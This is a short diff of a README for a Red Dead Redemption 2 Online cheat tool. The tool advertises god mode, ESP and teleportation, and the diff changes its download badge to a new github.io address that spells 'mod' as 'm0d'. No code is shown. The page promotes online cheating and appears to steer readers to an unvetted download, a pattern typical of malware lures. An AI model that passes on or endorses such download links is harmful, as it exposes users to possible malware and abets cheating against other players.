@@ -2,7 +2,7 @@
 
 Fikit Mod Menu is a powerful mod tool for Red Dead Redemption 2 Online, providing players with advanced features like god mode, teleportation, ESP, and custom spawning to enhance gameplay.
 
-[![Download Fikit Mod Menu](https://img.shields.io/badge/Download-Fikit_Mod_Menu-blueviolet)](https://fikit-mod-menu-cheat.github.io/.github)
+[![Download Fikit Mod Menu](https://img.shields.io/badge/Download-Fikit_Mod_Menu-blueviolet)](https://fikit-m0dmenu-download.github.io/.github/)
 
 ---
 
